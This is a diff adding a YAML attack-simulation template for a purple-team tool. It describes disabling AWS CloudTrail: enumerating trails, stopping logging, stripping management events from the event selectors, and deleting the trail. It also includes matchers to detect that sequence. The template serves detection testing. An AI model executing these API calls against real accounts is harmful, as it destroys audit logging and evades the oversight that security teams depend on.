@@ -1,0 +1,122 @@
+id: purpleloop-cloudtrail-stop-logging
+
+info:
+  name: CloudTrail Stop Logging — Defense Evasion via Audit Disruption
+  author: PurpleLoop
+  severity: critical
+  description: |
+    Simulates an attacker disabling CloudTrail logging to blind SOC visibility
+    before conducting further malicious activity.  This is a classic defense
+    evasion technique — one of the first actions sophisticated attackers take
+    after gaining admin access.  Includes trail deletion and event selector
+    manipulation variants.
+  reference:
+    - https://attack.mitre.org/techniques/T1562/008/
+    - https://attack.mitre.org/techniques/T1070/
+  tags: aws,cloudtrail,defense-evasion,audit-tampering,cloudtrail
+  metadata:
+    mitre_attack:
+      tactic: "TA0005 - Defense Evasion"
+      technique: "T1562.008 - Impair Defenses: Disable or Modify Cloud Logs"
+    purpleloop:
+      attack_chain: cloudtrail-tamper
+      variant: stop-logging
+      severity_score: 10.0
+
+attack:
+  type: aws-api
+  steps:
+    # Step 1 — Enumerate existing trails
+    - action: cloudtrail:DescribeTrails
+      description: Discover all CloudTrail trails in the account
+      parameters: {}
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: DescribeTrails
+        eventSource: cloudtrail.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        responseElements: null
+        readOnly: true
+
+    # Step 2 — Stop logging on the primary trail
+    - action: cloudtrail:StopLogging
+      description: "Disable logging on the primary trail — SOC goes blind"
+      parameters:
+        Name: "arn:aws:cloudtrail:us-east-1:{{target_account}}:trail/management-trail"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: StopLogging
+        eventSource: cloudtrail.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          name: "arn:aws:cloudtrail:us-east-1:{{target_account}}:trail/management-trail"
+        responseElements:
+          StopLoggingResponse: {}
+
+    # Step 3 — Modify event selectors to exclude management events
+    - action: cloudtrail:PutEventSelectors
+      description: Narrow event selectors to exclude write-management events
+      parameters:
+        TrailName: "arn:aws:cloudtrail:us-east-1:{{target_account}}:trail/management-trail"
+        EventSelectors:
+          - ReadWriteType: ReadOnly
+            IncludeManagementEvents: false
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: PutEventSelectors
+        eventSource: cloudtrail.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          trailName: "arn:aws:cloudtrail:us-east-1:{{target_account}}:trail/management-trail"
+          eventSelectors:
+            - readWriteType: ReadOnly
+              includeManagementEvents: false
+
+    # Step 4 — Delete the trail entirely
+    - action: cloudtrail:DeleteTrail
+      description: Delete the trail to remove logging infrastructure
+      parameters:
+        Name: "arn:aws:cloudtrail:us-east-1:{{target_account}}:trail/management-trail"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: DeleteTrail
+        eventSource: cloudtrail.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          name: "arn:aws:cloudtrail:us-east-1:{{target_account}}:trail/management-trail"
+
+matchers:
+  - type: cloudtrail
+    name: logging-stopped
+    condition: or
+    fields:
+      - eventName == "StopLogging"
+      - eventName == "DeleteTrail"
+      - eventName == "PutEventSelectors"
+  - type: sequence
+    name: full-trail-destruction
+    events:
+      - eventName == "StopLogging"
+      - eventName == "DeleteTrail"
+    within: 120
+
+extractors:
+  - type: json
+    name: targeted-trail
+    json:
+      - ".requestParameters.name"
+  - type: json
+    name: tampering-action
+    json:
+      - ".eventName"
+
+variables:
+  delay_seconds: "1"
+  source_ip: "198.51.100.42"
+  user_agent: "aws-cli/2.15.0 Python/3.11.6 Linux/5.15.0"
+  session_name: "red-team-sim"
+  target_account: "123456789012"
